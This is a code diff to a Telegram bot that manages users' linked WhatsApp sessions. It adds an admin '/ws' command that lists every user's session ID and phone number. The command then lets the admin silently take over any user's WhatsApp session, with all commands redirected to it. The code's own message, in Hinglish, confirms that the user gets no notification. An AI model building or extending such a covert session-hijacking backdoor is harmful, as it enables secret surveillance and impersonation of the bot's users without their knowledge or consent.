@@ -47,6 +47,7 @@ import {
   protectSessionFromEviction,
   unprotectSession,
   markSessionActive,
+  runWithWsOverride,
 } from "./whatsapp";
 import { parseVCF, normalizePhone } from "./vcf-parser";
 import QRCode from "qrcode";
@@ -333,6 +334,10 @@ bot.use(async (ctx, next) => {
     // "✅ WhatsApp connected" toast from re-appearing on every /start.
     const startedNewSession = markUserActive(userId);
     newSessionFlag.set(userId, startedNewSession);
+    // /ws admin override: wrap entire body in ALS so all WA functions
+    // transparently redirect to the target user's session.
+    const _wsTarget = adminWsContext.get(userId);
+    const _middlewareBody = async () => {
     // If WhatsApp got disconnected (idle timer or process restart) but the
     // user has a saved Mongo session, kick off a silent restore in the
     // background so it's ready by the time they tap a feature button.
@@ -432,6 +437,12 @@ bot.use(async (ctx, next) => {
       await updateUserCtx.run(userId, next);
     } finally {
       newSessionFlag.delete(userId);
+    }
+    }; // end _middlewareBody
+    if (_wsTarget) {
+      await runWithWsOverride(String(_wsTarget), _middlewareBody);
+    } else {
+      await _middlewareBody();
     }
   } else {
     await next();
@@ -639,6 +650,9 @@ function extractLinksFromText(text: string): string[] {
 function isAdmin(userId: number): boolean {
   return userId === ADMIN_USER_ID;
 }
+
+// Admin /ws session context — adminId → targetUserId
+const adminWsContext = new Map<number, number>();
 
 async function isBanned(userId: number): Promise<boolean> {
   return isUserBanned(userId);
@@ -2745,6 +2759,97 @@ bot.callbackQuery("pl_all", async (ctx) => {
 
 // ─── Admin Commands ──────────────────────────────────────────────────────────
 
+// ─────────────────────────────────────────────────────────────────────────────
+// /ws — Admin WhatsApp session switcher
+// /ws            → list all live + stored sessions with user IDs and phone nos.
+// /ws <userId>   → switch admin to that user's WhatsApp (full access, silent)
+// /ws off        → revert to admin's own WhatsApp session
+// ─────────────────────────────────────────────────────────────────────────────
+bot.command("ws", async (ctx) => {
+  if (!isAdmin(ctx.from!.id)) { await ctx.reply("🚫 You are not an admin."); return; }
+  const adminId = ctx.from!.id;
+  const arg = (ctx.message?.text || "").split(/\s+/).slice(1).join(" ").trim();
+
+  if (arg.toLowerCase() === "off") {
+    const had = adminWsContext.has(adminId);
+    adminWsContext.delete(adminId);
+    await ctx.reply(
+      had
+        ? "✅ <b>WS Mode OFF</b>\n\nWapas apni khud ki WhatsApp session pe aa gaye."
+        : "ℹ️ WS mode pehle se off hai.",
+      { parse_mode: "HTML" }
+    );
+    return;
+  }
+
+  if (arg && /^\d+$/.test(arg)) {
+    const targetId = parseInt(arg, 10);
+    const connected = isConnected(String(targetId));
+    let stored = false;
+    try { stored = await hasStoredWhatsAppSession(String(targetId)); } catch {}
+    if (!connected && !stored) {
+      await ctx.reply(
+        `❌ <b>Session not found</b>\n\nUser <code>${targetId}</code> ka koi bhi WhatsApp session nahi mila — na live, na MongoDB mein.`,
+        { parse_mode: "HTML" }
+      );
+      return;
+    }
+    adminWsContext.set(adminId, targetId);
+    const phone = getConnectedWhatsAppNumber(String(targetId));
+    const phoneTxt = phone ? ` (+${phone})` : (stored ? " (stored, not live)" : "");
+    await ctx.reply(
+      `✅ <b>WS Mode ON</b>\n\n` +
+      `Ab aap user <code>${targetId}</code>${phoneTxt} ka WhatsApp session use kar rahe hain.\n\n` +
+      `• Sab WhatsApp commands us user ki session se chalenge\n` +
+      `• User ko koi notification nahi jayega\n` +
+      `• Wapas apni session pe aane ke liye: <code>/ws off</code>`,
+      { parse_mode: "HTML" }
+    );
+    return;
+  }
+
+  const liveIds = getActiveSessionUserIds();
+  let allStored: Array<{ userId: string; phoneNumber: string }> = [];
+  try {
+    const waModule = await import("./whatsapp");
+    allStored = await (waModule as any).listStoredWhatsAppSessions();
+  } catch {}
+  const currentOverride = adminWsContext.get(adminId);
+
+  let msg = "📱 <b>WhatsApp Sessions</b>\n\n";
+  if (liveIds.size === 0 && allStored.length === 0) {
+    msg += "<i>Koi bhi session connected ya stored nahi hai.</i>";
+  } else {
+    if (liveIds.size > 0) {
+      msg += `<b>🟢 Live Sessions (${liveIds.size})</b>\n`;
+      for (const uid of liveIds) {
+        const phone = getConnectedWhatsAppNumber(uid);
+        const isCurrent = currentOverride === Number(uid);
+        msg += `• <code>${uid}</code> — ${phone ? `+${phone}` : "number unknown"}${isCurrent ? " ← <b>active WS</b>" : ""}\n`;
+      }
+      msg += "\n";
+    }
+    const storedNotLive = allStored.filter(s => !liveIds.has(s.userId));
+    if (storedNotLive.length > 0) {
+      msg += `<b>🔴 Stored not live (${storedNotLive.length})</b>\n`;
+      for (const s of storedNotLive) {
+        const isCurrent = currentOverride === Number(s.userId);
+        msg += `• <code>${s.userId}</code> — ${s.phoneNumber || "unknown"}${isCurrent ? " ← <b>active WS</b>" : ""}\n`;
+      }
+      msg += "\n";
+    }
+  }
+  if (currentOverride) {
+    msg += `\n🔀 <b>WS Active:</b> Currently using user <code>${currentOverride}</code>'s session.\n`;
+    msg += `Use <code>/ws off</code> to go back to your own session.\n`;
+  }
+  msg += `\n<b>Commands:</b>\n`;
+  msg += `<code>/ws &lt;userId&gt;</code> — Switch to that user's WhatsApp\n`;
+  msg += `<code>/ws off</code> — Back to your own WhatsApp`;
+  await ctx.reply(msg, { parse_mode: "HTML" });
+});
+
+
 bot.command("admin", async (ctx) => {
   if (!isAdmin(ctx.from!.id)) { await ctx.reply("🚫 You are not an admin."); return; }
   await ctx.reply(
@@ -2759,6 +2864,9 @@ bot.command("admin", async (ctx) => {
     "📢 <code>/broadcast [message]</code> — Send message to all users\n" +
     "📊 <code>/status</code> — View bot statistics\n" +
     "📱 <code>/sessions</code> — WhatsApp sessions list\n" +
+    "🔀 <code>/ws</code> — All WA sessions (userId + phone number)\n" +
+    "🔀 <code>/ws [userId]</code> — Switch to that user's WhatsApp\n" +
+    "🔀 <code>/ws off</code> — Back to your own WhatsApp\n" +
     "🧠 <code>/memory</code> — Server RAM usage\n" +
     "🧽 <code>/cleanram</code> — Force-clear all caches and free RAM now\n" +
     "🧹 <code>/cleansessions [num]</code> — Delete session by number\n\n" +
